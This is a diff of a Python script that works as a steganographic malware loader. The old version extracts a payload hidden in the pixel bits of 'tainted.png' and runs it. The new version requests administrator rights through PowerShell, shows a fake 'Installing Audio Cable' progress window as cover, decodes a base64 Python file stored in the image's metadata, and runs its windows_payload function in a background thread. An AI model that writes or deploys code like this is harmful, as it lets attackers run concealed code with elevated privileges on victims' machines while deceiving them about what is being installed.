@@ -1,83 +1,147 @@
-from PIL import Image
-import subprocess
 import os
+import sys
+import subprocess
+import ctypes
+import tkinter as tk
+from tkinter import messagebox, ttk
+from PIL import Image
+import importlib.util
+import base64
+import threading
 
-img_path = "./tainted.png"
-output_payload_path = "./extracted_payload.py"
+def log_checkpoint(message):
+    """ Log checkpoints for debugging purposes """
+    print(f"[DEBUG] {message}")
 
-# Convert a list of bits to a character
-def btoc(bits):
-    c_val = 0
-    bit_count = 7  # Big Endian
-    for bit in bits:
-        c_val += bit * (2 ** bit_count)
-        bit_count -= 1
-    return chr(c_val)
+def is_admin():
+    """ Check if the script is running with admin privileges """
+    log_checkpoint("Checking for admin privileges...")
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except AttributeError:
+        log_checkpoint("AttributeError occurred while checking admin privileges.")
+        return False
 
-# Convert character to list of bits (used for delimiter)
-def ctob(c):
-    output = [0] * 8  # Default 0 to replace with 1 when needed
-    c_val = ord(c)
+def run_as_admin():
+    """ Attempt to relaunch the script with admin privileges """
+    log_checkpoint("Attempting to run script as admin...")
+    if sys.platform == "win32":
+        try:
+            if not is_admin():
+                log_checkpoint("Not running as admin, attempting to elevate privileges...")
+                script = os.path.abspath(__file__)
+                params = ' '.join([script] + sys.argv[1:])
+                subprocess.run(['powershell', '-Command', f'Start-Process python -ArgumentList "{params}" -Verb runAs'], check=True)
+                log_checkpoint("Script elevated to admin successfully.")
+                return True  # Elevated privileges obtained
+            else:
+                log_checkpoint("Already running as admin.")
+                return True  # Already running with elevated privileges
+        except subprocess.CalledProcessError as e:
+            log_checkpoint(f"Failed to elevate privileges: {e}")
+            messagebox.showerror("Admin Privileges Required", f"Failed to elevate privileges: {e}")
+            return False  # Failed to obtain elevated privileges
+    return False  # Not on Windows platform
 
-    bit_count = 7  # Big Endian
-    for i in range(len(output)):
-        bit_value = pow(2, bit_count)
-        if bit_value <= c_val:
-            c_val -= bit_value
-            output[i] = 1
-        bit_count -= 1    
+def simulate_installation():
+    """ Simulate the installation process with a progress bar """
+    log_checkpoint("Simulating installation process...")
+    window = tk.Tk()
+    window.title("Installing Audio Cable")
+    window.geometry("300x200")
+    progress = tk.IntVar()
 
-    return output
+    def start_progress():
+        log_checkpoint("Installation process started...")
+        for i in range(101):
+            progress.set(i)
+            window.update_idletasks()
+            window.after(50)  # Simulate delay
+            window.after(85)
+            window.after(99)
+        log_checkpoint("Installation process completed.")
+        window.destroy()
+    
+    def close_progress():
+        window.destroy()
 
-# Define delimiter for stopping condition
-delimiter = "END"
-delimiter_bits = []
-for c in delimiter:
-    delimiter_bits.extend(ctob(c))
+    label = tk.Label(window, text="Installing Audio Cable...")
+    label.pack(pady=10)
+    progressbar = ttk.Progressbar(window, variable=progress, maximum=100)
+    progressbar.pack(pady=10, padx=10, fill=tk.X)
+    start_button = tk.Button(window, text="Start", command=start_progress)
+    start_button.pack(pady=10)
+    cancel_button = tk.Button(window, text="Cancel", command=close_progress)
+    cancel_button.pack(pady=10)
+    window.mainloop()
 
-# Pull in the tainted image
-image = Image.open(img_path)
-rgb_image = image.convert("RGB").load()
+def run_payload():
+    """ Execute the provided payload """
+    log_checkpoint("Running payload...")
+    img_path = "./tainted.png"
+    output_payload_path = "./extracted_payload.py"
 
-# Extract payload from image
-width, height = image.size
+    def extract_data_from_image(image_path):
+        log_checkpoint(f"Attempting to extract data from image: {image_path}")
+        try:
+            image = Image.open(image_path)
+            metadata = image.info
+            log_checkpoint(f"Image metadata: {metadata}")
+            encoded_string = metadata.get('python_file')
+            log_checkpoint(f"Encoded string found: {bool(encoded_string)}")
+            return encoded_string
+        except Exception as e:
+            log_checkpoint(f"Error reading image metadata: {e}")
+            return None
 
-# List to store the extracted bits
-payload_bits = []
+    def decode_base64_to_file(encoded_string, output_file_path):
+        log_checkpoint("Attempting to decode base64 string to file...")
+        try:
+            decoded_bytes = base64.b64decode(encoded_string)
+            with open(output_file_path, 'wb') as file:
+                file.write(decoded_bytes)
+            log_checkpoint(f"File successfully written to: {output_file_path}")
+        except Exception as e:
+            log_checkpoint(f"Error decoding base64 string: {e}")
+            raise
 
-# Iterate over each pixel and extract LSBs
-for y in range(height):
-    for x in range(width):
-        r, g, b = rgb_image[x, y]
-        payload_bits.append(r & 0x01)  # Extract LSB of red channel
-        payload_bits.append(g & 0x01)  # Extract LSB of green channel
-        payload_bits.append(b & 0x01)  # Extract LSB of blue channel
+    extracted_encoded_string = extract_data_from_image(img_path)
+    if extracted_encoded_string:
+        try:
+            decode_base64_to_file(extracted_encoded_string, output_payload_path)
+            print("Python file extracted successfully!")
+        except Exception:
+            log_checkpoint("Failed to decode and save the Python file.")
+            return
+    else:
+        log_checkpoint("No embedded Python file found in the image.")
+        return
 
-        # Check if the last bits match the delimiter
-        if payload_bits[-len(delimiter_bits):] == delimiter_bits:
-            payload_bits = payload_bits[:-len(delimiter_bits)]  # Remove the delimiter
-            break
-    if payload_bits[-len(delimiter_bits):] == delimiter_bits:
-        break
+    try:
+        log_checkpoint(f"Attempting to execute the extracted payload: {output_payload_path}")
+        spec = importlib.util.spec_from_file_location("extracted_payload", output_payload_path)
+        extracted_module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(extracted_module)
 
-# Convert payload bits to characters
-payload = ""
-while len(payload_bits) >= 8:
-    char_bits = payload_bits[:8]  # Take the first 8 bits
-    payload_bits = payload_bits[8:]  # Remove those 8 bits
-    payload += btoc(char_bits)  # Convert to character and append
+        if hasattr(extracted_module, "windows_payload"):
+            log_checkpoint("Found `windows_payload` function. Executing...")
+            extracted_module.windows_payload()
+            print("Successfully executed `windows_payload` from the extracted payload.")
+        else:
+            log_checkpoint("No `windows_payload` function found in the extracted payload.")
+    except Exception as e:
+        log_checkpoint(f"Error occurred while importing or executing the payload: {e}")
 
-# Save the extracted payload
-with open(output_payload_path, "w", encoding="utf-8") as file:
-    file.write(payload)
+if __name__ == "__main__":
+    if run_as_admin():  # Only proceed if elevated privileges are obtained
+        # Start both the installation simulation and the payload execution in parallel
+        installation_thread = threading.Thread(target=simulate_installation)
+        payload_thread = threading.Thread(target=run_payload)
 
-print(f"Successfully extracted payload to {output_payload_path}")
+        installation_thread.start()
+        payload_thread.start()
 
-# Execute the extracted payload
-try:
-    print("Executing the extracted payload...")
-    subprocess.run(["python", output_payload_path], check=True)
-except subprocess.CalledProcessError as e:
-    print(f"Error occurred while executing the payload: {e}")
-except FileNotFoundError:
-    print(f"Error: Extracted payload not found at {output_payload_path}")
+        installation_thread.join()
+        payload_thread.join()
+
+        log_checkpoint("Script finished.")
